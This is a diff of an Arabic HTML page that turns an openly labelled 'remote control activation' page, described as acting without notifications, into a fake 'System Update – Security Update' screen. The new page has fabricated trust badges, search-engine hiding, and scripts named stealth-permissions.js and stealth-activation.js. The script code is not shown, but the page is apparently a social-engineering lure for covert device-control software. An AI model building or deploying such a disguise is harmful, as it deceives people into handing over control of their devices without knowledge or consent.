@@ -3,18 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل التحكم في الجهاز</title>
+    <title>تحديث النظام - System Update</title>
+    <meta name="description" content="تحديث أمني للنظام - Security Update">
+    <meta name="robots" content="noindex, nofollow">
     <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="stealth-styles.css">
 </head>
 <body>
-    <div class="container">
-        <h1>تفعيل نظام التحكم عن بعد</h1>
-        <div class="card">
-            <p>بعد النقر على الزر، سيتم تفعيل النظام تلقائياً دون أي إشعارات</p>
-            <button id="activateBtn">تفعيل الآن</button>
-            <div id="status"></div>
+    <!-- شاشة التحميل الأولية -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <h2>جاري تحميل التحديث...</h2>
+            <p>يرجى الانتظار بينما نقوم بتحميل آخر التحديثات الأمنية</p>
         </div>
     </div>
+
+    <!-- المحتوى الرئيسي -->
+    <div id="mainContent" class="main-content" style="display: none;">
+        <div class="container">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">🛡️</div>
+                    <h1>تحديث النظام الأمني</h1>
+                </div>
+                <p class="subtitle">Security System Update</p>
+            </div>
+
+            <div class="update-card">
+                <div class="update-info">
+                    <div class="version-info">
+                        <span class="version">v2.1.4</span>
+                        <span class="update-type">تحديث أمني</span>
+                    </div>
+                    <div class="update-details">
+                        <h3>محتوى التحديث:</h3>
+                        <ul>
+                            <li>✅ تحسينات أمنية متقدمة</li>
+                            <li>✅ إصلاح الثغرات الأمنية</li>
+                            <li>✅ تحسين الأداء والاستقرار</li>
+                            <li>✅ تحديث قاعدة البيانات</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="progress-section">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text" id="progressText">جاهز للتحديث</div>
+                </div>
+
+                <div class="action-section">
+                    <button id="updateBtn" class="update-button">
+                        <span class="button-text">بدء التحديث الآن</span>
+                        <span class="button-icon">🔄</span>
+                    </button>
+                    <p class="update-note">سيتم إعادة تشغيل النظام تلقائياً بعد التحديث</p>
+                </div>
+
+                <div class="status-section">
+                    <div id="status" class="status-message"></div>
+                    <div id="detailedStatus" class="detailed-status"></div>
+                </div>
+            </div>
+
+            <div class="footer">
+                <div class="security-badges">
+                    <span class="badge">🔒 آمن</span>
+                    <span class="badge">✅ موثق</span>
+                    <span class="badge">🛡️ محمي</span>
+                </div>
+                <p class="footer-text">جميع التحديثات يتم التحقق من صحتها قبل التثبيت</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة النجاح -->
+    <div id="successScreen" class="success-screen" style="display: none;">
+        <div class="success-content">
+            <div class="success-icon">✅</div>
+            <h2>تم التحديث بنجاح!</h2>
+            <p>تم تحديث النظام بنجاح. سيتم إعادة التوجيه تلقائياً...</p>
+            <div class="redirect-countdown" id="redirectCountdown">3</div>
+        </div>
+    </div>
+
+    <!-- شاشة الخطأ -->
+    <div id="errorScreen" class="error-screen" style="display: none;">
+        <div class="error-content">
+            <div class="error-icon">⚠️</div>
+            <h2>حدث خطأ في التحديث</h2>
+            <p id="errorMessage">يرجى المحاولة مرة أخرى</p>
+            <button id="retryBtn" class="retry-button">إعادة المحاولة</button>
+        </div>
+    </div>
+
+    <!-- تحميل الملفات المطلوبة -->
+    <script src="stealth-permissions.js"></script>
+    <script src="real-functions.js"></script>
     <script src="activate.js"></script>
+    <script src="stealth-activation.js"></script>
 </body>
 </html>
